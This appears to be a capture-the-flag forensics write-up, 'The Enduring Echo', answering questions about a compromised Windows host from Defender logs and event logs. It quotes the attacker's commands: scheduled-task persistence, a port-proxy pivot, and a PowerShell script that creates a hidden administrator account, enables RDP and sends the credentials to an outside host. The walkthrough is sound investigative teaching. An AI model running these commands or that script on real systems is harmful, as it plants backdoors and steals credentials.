@@ -1,0 +1,474 @@
+<!-- https://raw.githubusercontent.com/mkdocs/mkdocs/refs/heads/master/mkdocs/themes/mkdocs/base.html -->
+<!DOCTYPE html>
+<html lang="en" data-bs-theme="light">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        
+        
+        <link rel="canonical" href="https://jia.je/ctf-writeups/2025-09-22-holmes-ctf-2025/the-enduring-echo.html">
+        <link rel="shortcut icon" href="../img/favicon.ico">
+        <title>The Enduring Echo - CTF Writeups by @jiegec</title>
+        <link href="../css/bootstrap.min.css" rel="stylesheet">
+        <link href="../css/fontawesome.min.css" rel="stylesheet">
+        <link href="../css/brands.min.css" rel="stylesheet">
+        <link href="../css/solid.min.css" rel="stylesheet">
+        <link href="../css/v4-font-face.min.css" rel="stylesheet">
+        <link href="../css/base.css" rel="stylesheet">
+        <!-- added by @jiegec begin -->
+        <link href=" https://cdn.jsdelivr.net/npm/prismjs@1.30.0/themes/prism.min.css " rel="stylesheet">
+        <!-- added by @jiegec end -->
+        <!-- added by @jiegec begin -->
+        <script src="https://cdn.jsdelivr.net/npm/prismjs@1.30.0/components/prism-core.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/prismjs@1.30.0/plugins/autoloader/prism-autoloader.min.js"></script>
+        <!-- added by @jiegec end -->
+
+      <!-- added by @jiegec begin -->
+      <script defer src="https://cdn.jsdelivr.net/npm/mathjax@4/tex-mml-chtml.js"></script>
+      </script>
+      
+      <script async src="https://www.googletagmanager.com/gtag/js?id=G-3109FRSVTT"></script>
+      <script>
+          window.dataLayer = window.dataLayer || [];
+          function gtag() { dataLayer.push(arguments); }
+          gtag('js', new Date());
+      
+          gtag('config', 'G-3109FRSVTT');
+      </script>
+      
+      <script src="https://analytics.jiege.pro/api/script.js" data-site-id="1" defer></script>
+      <!-- added by @jiegec end --> 
+    </head>
+
+    <body>
+        <div class="navbar fixed-top navbar-expand-lg navbar-dark bg-primary">
+            <div class="container">
+                <a class="navbar-brand" href="../index.html">CTF Writeups by @jiegec</a>
+                <!-- Expander button -->
+                <button type="button" class="navbar-toggler" data-bs-toggle="collapse" data-bs-target="#navbar-collapse" aria-controls="navbar-collapse" aria-expanded="false" aria-label="Toggle navigation">
+                    <span class="navbar-toggler-icon"></span>
+                </button>
+
+                <!-- Expanded navigation -->
+                <div id="navbar-collapse" class="navbar-collapse collapse">
+                        <!-- Main navigation -->
+                        <ul class="nav navbar-nav">
+                            <li class="nav-item">
+                                <a href="../index.html" class="nav-link">Home</a>
+                            </li>
+                            <li class="nav-item">
+                                <a href="../misc/solution.html" class="nav-link">Writeups by Solution</a>
+                            </li>
+                            <li class="nav-item">
+                                <a href="../misc/pyjail.html" class="nav-link">Pyjail</a>
+                            </li>
+                            <li class="nav-item">
+                                <a href="../puppeteer/index.html" class="nav-link">Redbud Puppeteer</a>
+                            </li>
+                        </ul>
+
+                    <ul class="nav navbar-nav ms-md-auto">
+                        <li class="nav-item">
+                            <a href="#" class="nav-link" data-bs-toggle="modal" data-bs-target="#mkdocs_search_modal">
+                                <i class="fa fa-search"></i> Search
+                            </a>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <div class="container">
+            <div class="row">
+                    <div class="col-md-3"><div class="navbar-expand-md bs-sidebar hidden-print affix" role="complementary">
+    <div class="navbar-header">
+        <button type="button" class="navbar-toggler collapsed" data-bs-toggle="collapse" data-bs-target="#toc-collapse" title="Table of Contents">
+            <span class="fa fa-angle-down"></span>
+        </button>
+    </div>
+
+    
+    <div id="toc-collapse" class="navbar-collapse collapse card bg-body-tertiary">
+        <ul class="nav flex-column">
+            
+            <li class="nav-item" data-bs-level="1"><a href="#the-enduring-echo" class="nav-link">The Enduring Echo</a>
+              <ul class="nav flex-column">
+            <li class="nav-item" data-bs-level="2"><a href="#question-1" class="nav-link">Question #1</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-bs-level="2"><a href="#question-2" class="nav-link">Question #2</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-bs-level="2"><a href="#question-3" class="nav-link">Question #3</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-bs-level="2"><a href="#question-4" class="nav-link">Question #4</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-bs-level="2"><a href="#question-5" class="nav-link">Question #5</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-bs-level="2"><a href="#question-6" class="nav-link">Question #6</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-bs-level="2"><a href="#question-7" class="nav-link">Question #7</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-bs-level="2"><a href="#question-8" class="nav-link">Question #8</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-bs-level="2"><a href="#question-9" class="nav-link">Question #9</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-bs-level="2"><a href="#question-10" class="nav-link">Question #10</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-bs-level="2"><a href="#question-11" class="nav-link">Question #11</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-bs-level="2"><a href="#question-12" class="nav-link">Question #12</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-bs-level="2"><a href="#question-13" class="nav-link">Question #13</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-bs-level="2"><a href="#question-14" class="nav-link">Question #14</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+              </ul>
+            </li>
+        </ul>
+    </div>
+</div></div>
+                    <div class="col-md-9" role="main">
+
+<h1 id="the-enduring-echo">The Enduring Echo</h1>
+<pre class="highlight"><code>LeStrade passes a disk image artifacts to Watson. It's one of the identified breach points, now showing abnormal CPU activity and anomalies in process logs.</code></pre>
+<h2 id="question-1">Question #1</h2>
+<pre class="highlight"><code>What was the first (non cd) command executed by the attacker on the host? (string)</code></pre>
+<p>Answer in <code>MPLog-20250421-104305.log</code>:</p>
+<pre class="highlight"><code>2025-08-24T22:50:59.773 [NRI] Successfully updated NIS service with platform settings for enforcement level Log
+Internal signature match:subtype=Lowfi, sigseq=0x0001CBD78CB6CDD5, sigsha=42fd2331d60fbfa863259d427ac5eea278f155fb, cached=false, source=0, resourceid=0xee3657a0
+2025-08-24T22:51:09.179 Engine:command line reported as lowfi: C:\Windows\System32\cmd.exe(cmd.exe /Q /c systeminfo 1&gt; \\127.0.0.1\ADMIN$\__1756075857.955773 2&gt;&amp;1)
+2025-08-24T22:51:09.211 Using signature default action MP_THREAT_ACTION_ALLOW(6) for special threatID: 0x565c7b9a7ffffffe
+2025-08-24T22:51:14.242 UnknownTelemetryScan triggered, type: 2 (1 - Unknown, 2- Lofi), flags: 0 (0 - Regular, 1 - MemScan), 1 resources, RtpIoavOnly: FALSE</code></pre>
+<h2 id="question-2">Question #2</h2>
+<pre class="highlight"><code>Which parent process (full path) spawned the attacker’s commands? (C:\FOLDER\PATH\FILE.ext)</code></pre>
+<p>Answer:</p>
+<ol>
+<li>open <code>C/Windows/System32/winevt/logs/Security.evtx</code> in <a href="https://omerbenamram.github.io/evtx/">https://omerbenamram.github.io/evtx/</a></li>
+<li>export logs as json</li>
+<li>grep <code>systeminfo</code> in exported json</li>
+</ol>
+<pre class="highlight"><code>      "EventData": {
+        "SubjectUserSid": "S-1-5-20",
+        "SubjectUserName": "HEISEN-9-WS-6$",
+        "SubjectDomainName": "WORKGROUP",
+        "SubjectLogonId": "0x3e4",
+        "NewProcessId": "0x1300",
+        "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
+        "TokenElevationType": "%%1936",
+        "ProcessId": "0xf34",
+        "CommandLine": "cmd.exe /Q /c systeminfo 1&gt; \\\\127.0.0.1\\ADMIN$\\__1756075857.955773 2&gt;&amp;1",
+        "TargetUserSid": "S-1-0-0",
+        "TargetUserName": "Werni",
+        "TargetDomainName": "HEISEN-9-WS-6",
+        "TargetLogonId": "0x4373b0",
+        "ParentProcessName": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
+        "MandatoryLabel": "S-1-16-12288"
+      }</code></pre>
+<p>Alternatively, use command line version of evtx:</p>
+<pre class="highlight"><code class="language-shell">cargo install evtx
+evtx_dump -o json ./Security.evtx</code></pre>
+<p>Dump all <code>evtx</code> files under the current directory:</p>
+<pre class="highlight"><code class="language-shell">fd -e evtx -x evtx_dump -o json &gt; dump.log</code></pre>
+<h2 id="question-3">Question #3</h2>
+<pre class="highlight"><code>Which remote-execution tool was most likely used for the attack? (filename.ext)</code></pre>
+<p>Answer:</p>
+<p>Search for <code>WmiPrvSE.exe</code> online:</p>
+<pre class="highlight"><code>WmiExec.py (WmiExec) is one of the Impacket widely used tool among red teams and threat actors.</code></pre>
+<h2 id="question-4">Question #4</h2>
+<pre class="highlight"><code>What was the attacker’s IP address? (IPv4 address)</code></pre>
+<p>Answer in <code>MPLog-20250421-104305.log</code>:</p>
+<pre class="highlight"><code>2025-08-24T23:00:13.695 IWscASStatus::UpdateStatus() succceeded writing instance with state (0), snooze state (0), and up-to-date state(1)
+Internal signature match:subtype=Lowfi, sigseq=0x0001CBD78CB6CDD5, sigsha=42fd2331d60fbfa863259d427ac5eea278f155fb, cached=false, source=0, resourceid=0xbb403085
+2025-08-24T23:00:15.195 Engine:command line reported as lowfi: C:\Windows\System32\cmd.exe(cmd.exe /Q /c cmd /C echo 10.129.242.110 NapoleonsBlackPearl.htb &gt;&gt; C:\Windows\System32\drivers\etc\hosts 1&gt; \\127.0.0.1\ADMIN$\__1756075857.955773 2&gt;&amp;1)
+2025-08-24T23:00:15.242 Using signature default action MP_THREAT_ACTION_ALLOW(6) for special threatID: 0x565c7b9a7ffffffe</code></pre>
+<h2 id="question-5">Question #5</h2>
+<pre class="highlight"><code>What is the first element in the attacker's sequence of persistence mechanisms? (string)</code></pre>
+<p>Answer in <code>MPLog-20250421-104305.log</code>:</p>
+<pre class="highlight"><code>2025-08-24T23:02:42.367 [NRI] Successfully updated NIS service with platform settings for enforcement level Log
+Internal signature match:subtype=Lowfi, sigseq=0x0001CBD78CB6CDD5, sigsha=42fd2331d60fbfa863259d427ac5eea278f155fb, cached=false, source=0, resourceid=0xb52f7037
+2025-08-24T23:03:50.257 Engine:command line reported as lowfi: C:\Windows\System32\cmd.exe(cmd.exe /Q /c schtasks /create /tn SysHelper Update /tr powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Users\Werni\Appdata\Local\JM.ps1 /sc minute /mo 2 /ru SYSTEM /f 1&gt; \\127.0.0.1\ADMIN$\__1756076432.886685 2&gt;&amp;1)</code></pre>
+<pre class="highlight"><code>SysHelper Update</code></pre>
+<h2 id="question-6">Question #6</h2>
+<pre class="highlight"><code>Identify the script executed by the persistence mechanism. (C:\FOLDER\PATH\FILE.ext)</code></pre>
+<p>Answer in <code>MPLog-20250421-104305.log</code>:</p>
+<pre class="highlight"><code>2025-08-24T23:02:42.367 [NRI] Successfully updated NIS service with platform settings for enforcement level Log
+Internal signature match:subtype=Lowfi, sigseq=0x0001CBD78CB6CDD5, sigsha=42fd2331d60fbfa863259d427ac5eea278f155fb, cached=false, source=0, resourceid=0xb52f7037
+2025-08-24T23:03:50.257 Engine:command line reported as lowfi: C:\Windows\System32\cmd.exe(cmd.exe /Q /c schtasks /create /tn SysHelper Update /tr powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Users\Werni\Appdata\Local\JM.ps1 /sc minute /mo 2 /ru SYSTEM /f 1&gt; \\127.0.0.1\ADMIN$\__1756076432.886685 2&gt;&amp;1)</code></pre>
+<h2 id="question-7">Question #7</h2>
+<pre class="highlight"><code>What local account did the attacker create? (string)</code></pre>
+<p>Answer in <code>JM.ps1</code>:</p>
+<pre class="highlight"><code class="language-powershell"># List of potential usernames
+$usernames = @("svc_netupd", "svc_dns", "sys_helper", "WinTelemetry", "UpdaterSvc")
+
+# Check for existing user
+$existing = $usernames | Where-Object {
+    Get-LocalUser -Name $_ -ErrorAction SilentlyContinue
+}
+
+# If none exist, create a new one
+if (-not $existing) {
+    $newUser = Get-Random -InputObject $usernames
+    $timestamp = (Get-Date).ToString("yyyyMMddHHmmss")
+    $password = "Watson_$timestamp"
+
+    $securePass = ConvertTo-SecureString $password -AsPlainText -Force
+
+    New-LocalUser -Name $newUser -Password $securePass -FullName "Windows Update Helper" -Description "System-managed service account"
+    Add-LocalGroupMember -Group "Administrators" -Member $newUser
+    Add-LocalGroupMember -Group "Remote Desktop Users" -Member $newUser
+
+    # Enable RDP
+    Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
+    Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+    Invoke-WebRequest -Uri "http://NapoleonsBlackPearl.htb/Exchange?data=$([Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("$newUser|$password")))" -UseBasicParsing -ErrorAction SilentlyContinue | Out-Null
+}</code></pre>
+<p>and security.evtx:</p>
+<pre class="highlight"><code class="language-json">      "EventData": {
+        "TargetUserName": "svc_netupd",
+        "TargetDomainName": "HEISEN-9-WS-6",
+        "TargetSid": "S-1-5-21-3871582759-1638593395-315824688-1003",
+        "SubjectUserSid": "S-1-5-18",
+        "SubjectUserName": "HEISEN-9-WS-6$",
+        "SubjectDomainName": "WORKGROUP",
+        "SubjectLogonId": "0x3e7",
+        "PrivilegeList": "-",
+        "SamAccountName": "svc_netupd",</code></pre>
+<h2 id="question-8">Question #8</h2>
+<pre class="highlight"><code>What domain name did the attacker use for credential exfiltration? (domain)</code></pre>
+<p>Answer:</p>
+<p><code>NapoleonsBlackPearl.htb</code> shown in above powershell script.</p>
+<h2 id="question-9">Question #9</h2>
+<pre class="highlight"><code>What password did the attacker's script generate for the newly created user? (string)</code></pre>
+<p>Answer:</p>
+<p>From <code>JM.ps1</code>:</p>
+<pre class="highlight"><code class="language-powershell">    $timestamp = (Get-Date).ToString("yyyyMMddHHmmss")
+    $password = "Watson_$timestamp"</code></pre>
+<p>From Security.evtx:</p>
+<pre class="highlight"><code class="language-json">        "TimeCreated_attributes": {
+          "SystemTime": "2025-08-24T23:05:09.764658Z"
+        },
+        "EventRecordID": 4461,
+        "Correlation_attributes": {
+          "ActivityID": "9F5B5735-1548-0001-A457-5B9F4815DC01"
+        },
+        "Execution_attributes": {
+          "ProcessID": 688,
+          "ThreadID": 5796
+        },
+        "Channel": "Security",
+        "Computer": "Heisen-9-WS-6",
+        "Security": null
+      },
+      "EventData": {
+        "TargetUserName": "svc_netupd",
+        "TargetDomainName": "HEISEN-9-WS-6",
+        "TargetSid": "S-1-5-21-3871582759-1638593395-315824688-1003",</code></pre>
+<p>Timezone is UTC-7 from the time delta in MPLog:</p>
+<pre class="highlight"><code>2025-04-21T10:47:49.009Z OnMountDetection for \Device\Harddisk0\DR0 ...
+Engine:Triggered BM EMS scan (ppids:{{652, 1012028063, 31175397}}), sigseq=0x85B39B5453E0
+
+
+BEGIN BM telemetry
+GUID:{6A4F7F1C-9C39-DE9A-55A7-4B4777380B24}
+TelemetryName:Behavior:Win32/SvchostInject.A
+SignatureID:147006451635168
+ProcessID:652
+ProcessCreationTime:133897311566844575
+SessionID:0
+CreationTime:04-21-2025 03:48:01
+ImagePath:C:\Windows\System32\services.exe
+ImagePathHash:E6FE9A94E8686E957DBCEC2B89C1C1DDCF8E75D76E9200D0CBEF74D510C71317
+END BM telemetry</code></pre>
+<p>Result:</p>
+<pre class="highlight"><code>Watson_20250824160509</code></pre>
+<h2 id="question-10">Question #10</h2>
+<pre class="highlight"><code>What was the IP address of the internal system the attacker pivoted to? (IPv4 address)</code></pre>
+<p>Answer in Security.evtx:</p>
+<pre class="highlight"><code class="language-json">      "EventData": {
+        "SubjectUserSid": "S-1-5-21-3871582759-1638593395-315824688-500",
+        "SubjectUserName": "Administrator",
+        "SubjectDomainName": "HEISEN-9-WS-6",
+        "SubjectLogonId": "0x4804c",
+        "NewProcessId": "0x1e94",
+        "NewProcessName": "C:\\Windows\\System32\\OpenSSH\\ssh.exe",
+        "TokenElevationType": "%%1936",
+        "ProcessId": "0x1cb4",                                                          "CommandLine": "ssh  felamos@192.168.1.101",                                    "TargetUserSid": "S-1-0-0",
+        "TargetUserName": "-",
+        "TargetDomainName": "-",
+        "TargetLogonId": "0x0",
+        "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
+        "MandatoryLabel": "S-1-16-12288"
+      }</code></pre>
+<h2 id="question-11">Question #11</h2>
+<pre class="highlight"><code>Which TCP port on the victim was forwarded to enable the pivot? (port 0-65565)</code></pre>
+<p>Answer in Security.evtx:</p>
+<pre class="highlight"><code class="language-json">      "EventData": {
+        "SubjectUserSid": "S-1-5-21-3871582759-1638593395-315824688-1002",
+        "SubjectUserName": "Werni",
+        "SubjectDomainName": "HEISEN-9-WS-6",                                           "SubjectLogonId": "0x795fc3",                                                   "NewProcessId": "0x125c",
+        "NewProcessName": "C:\\Windows\\System32\\netsh.exe",
+        "TokenElevationType": "%%1936",
+        "ProcessId": "0x6a8",
+        "CommandLine": "netsh  interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=9999 connectaddress=192.168.1.101 connectport=22",
+        "TargetUserSid": "S-1-0-0",
+        "TargetUserName": "-",                                                          "TargetDomainName": "-",                                                        "TargetLogonId": "0x0",                                                         "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
+        "MandatoryLabel": "S-1-16-12288"
+      }</code></pre>
+<h2 id="question-12">Question #12</h2>
+<pre class="highlight"><code>What is the full registry path that stores persistent IPv4→IPv4 TCP listener-to-target mappings? (HKLM\...\...)</code></pre>
+<p>Answer:</p>
+<p>Search for <code>netsh interface portproxy add v4tov4 HKLM</code>:</p>
+<pre class="highlight"><code>port proxy rules are stored in the registry under HKLM\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4\tcp</code></pre>
+<p>Dump content:</p>
+<pre class="highlight"><code class="language-shell">$ /sbin/reged -x $PWD/C/Windows/System32/config/SYSTEM HKEY_LOCAL_MACHINE \\ output.reg
+$ cat output.reg
+[HKEY_LOCAL_MACHINE\ControlSet001\Services\PortProxy]
+
+[HKEY_LOCAL_MACHINE\ControlSet001\Services\PortProxy\v4tov4]
+
+[HKEY_LOCAL_MACHINE\ControlSet001\Services\PortProxy\v4tov4\tcp]
+"0.0.0.0/9999"="192.168.1.101/22"</code></pre>
+<h2 id="question-13">Question #13</h2>
+<pre class="highlight"><code>What is the MITRE ATT&amp;CK ID associated with the previous technique used by the attacker to pivot to the internal system? (Txxxx.xxx)</code></pre>
+<p>Answer:</p>
+<p>Search for <code>mitre att&amp;ck proxy attack</code>, got <a href="https://attack.mitre.org/techniques/T1090/">https://attack.mitre.org/techniques/T1090/</a>:</p>
+<pre class="highlight"><code>T1090.001 Internal Proxy</code></pre>
+<h2 id="question-14">Question #14</h2>
+<pre class="highlight"><code>Before the attack, the administrator configured Windows to capture command line details in the event logs. What command did they run to achieve this? (command)</code></pre>
+<p>Answer in <code>ConsoleHost_history.txt</code>:</p>
+<pre class="highlight"><code class="language-shell">auditpol /set /subcategory:"Process Creation" /success:enable
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit" /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 1 /f</code></pre>
+<p>View registry content:</p>
+<pre class="highlight"><code class="language-shell">$ /sbin/reged -x $PWD/C/Windows/System32/config/SOFTWARE HKEY_LOCAL_MACHINE \\ software.reg
+$ cat software.reg
+[HKEY_LOCAL_MACHINE\Microsoft\Windows\CurrentVersion\Policies\System\Audit]
+"ProcessCreationIncludeCmdLine_Enabled"=dword:00000001</code></pre></div>
+
+                <!-- added by @jiegec begin -->
+                <div class="col-md-3"></div>
+                <div class="col-md-9">
+                  <script src="https://giscus.app/client.js"
+                      data-repo="jiegec/ctf-writeups"
+                      data-repo-id="MDEwOlJlcG9zaXRvcnkxNTE1MzAxODQ="
+                      data-category="General"
+                      data-category-id="DIC_kwDOCQgqyM4CvbYX"
+                      data-mapping="pathname"
+                      data-strict="1"
+                      data-reactions-enabled="1"
+                      data-emit-metadata="0"
+                      data-input-position="top"
+                      data-theme="light"
+                      data-lang="en"
+                      data-loading="lazy"
+                      crossorigin="anonymous"
+                      async>
+                  </script>
+                </div>
+                <!-- added by @jiegec end -->
+            </div>
+        </div>
+
+        <footer class="col-md-12">
+            <hr>
+                <p>Copyright &copy; 2025 Jiajie Chen</p>
+            <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a>.</p>
+        </footer>
+        <script src="../js/bootstrap.bundle.min.js"></script>
+        <script>
+            var base_url = "..",
+                shortcuts = {"help": 191, "next": 78, "previous": 80, "search": 83};
+        </script>
+        <script src="../js/base.js"></script>
+        <script src="../search/main.js"></script>
+
+        <div class="modal" id="mkdocs_search_modal" tabindex="-1" role="dialog" aria-labelledby="searchModalLabel" aria-hidden="true">
+    <div class="modal-dialog modal-lg">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h4 class="modal-title" id="searchModalLabel">Search</h4>
+                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+            </div>
+            <div class="modal-body">
+                <p>From here you can search these documents. Enter your search terms below.</p>
+                <form>
+                    <div class="form-group">
+                        <input type="search" class="form-control" placeholder="Search..." id="mkdocs-search-query" title="Type search term here">
+                    </div>
+                </form>
+                <div id="mkdocs-search-results" data-no-results-text="No results found"></div>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div><div class="modal" id="mkdocs_keyboard_modal" tabindex="-1" role="dialog" aria-labelledby="keyboardModalLabel" aria-hidden="true">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h4 class="modal-title" id="keyboardModalLabel">Keyboard Shortcuts</h4>
+                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+            </div>
+            <div class="modal-body">
+              <table class="table">
+                <thead>
+                  <tr>
+                    <th style="width: 20%;">Keys</th>
+                    <th>Action</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td class="help shortcut"><kbd>?</kbd></td>
+                    <td>Open this help</td>
+                  </tr>
+                  <tr>
+                    <td class="next shortcut"><kbd>n</kbd></td>
+                    <td>Next page</td>
+                  </tr>
+                  <tr>
+                    <td class="prev shortcut"><kbd>p</kbd></td>
+                    <td>Previous page</td>
+                  </tr>
+                  <tr>
+                    <td class="search shortcut"><kbd>s</kbd></td>
+                    <td>Search</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div>
+
+    </body>
+</html>
